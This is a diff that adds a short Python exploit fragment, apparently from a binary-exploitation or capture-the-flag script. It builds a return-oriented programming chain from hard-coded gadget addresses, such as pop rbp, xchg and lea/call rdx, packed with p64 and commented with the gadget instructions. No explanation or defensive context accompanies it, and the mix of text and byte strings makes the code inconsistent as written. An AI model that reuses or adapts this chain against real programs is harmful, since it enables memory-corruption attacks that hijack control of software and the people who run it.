@@ -1,0 +1,31 @@
+payload = p64(0x4011ad)
+#0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x4011ad)+p64(0x4621f7)
+# 0x00000000004621f7: xchg ebp, eax; ret 2; 
+payload += p64(0x4792a2)+"\x00"*2
+# 0x00000000004792a2: xchg edx, eax; ret; 
+payload += p64(0x4011ad)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x100041)+p64(0x429df9)
+# 0x0000000000429df9: lea eax, [rbp - 0x40]; mov rdi, rax; call rdx; 
+payload += b''
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x4011ad)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x100004)+p64(0x4621f7)
+# 0x00000000004621f7: xchg ebp, eax; ret 2; 
+payload += p64(0x431bdc)+"\x00"*2
+# 0x0000000000431bdc: xchg ecx, eax; ret 4; 
+payload += p64(0x4011ad)+"\x00"*4
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x100002)+p64(0x4621f7)
+# 0x00000000004621f7: xchg ebp, eax; ret 2; 
+payload += p64(0x455564)+"\x00"*2
+# 0x0000000000455564: xchg esi, eax; ret; 
+payload += p64(0x4011ad)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x100003)+p64(0x4621f7)
+# 0x00000000004621f7: xchg ebp, eax; ret 2; 
+payload += p64(0x4792a2)+"\x00"*2
+# 0x00000000004792a2: xchg edx, eax; ret; 
+payload += p64(0x40127d)
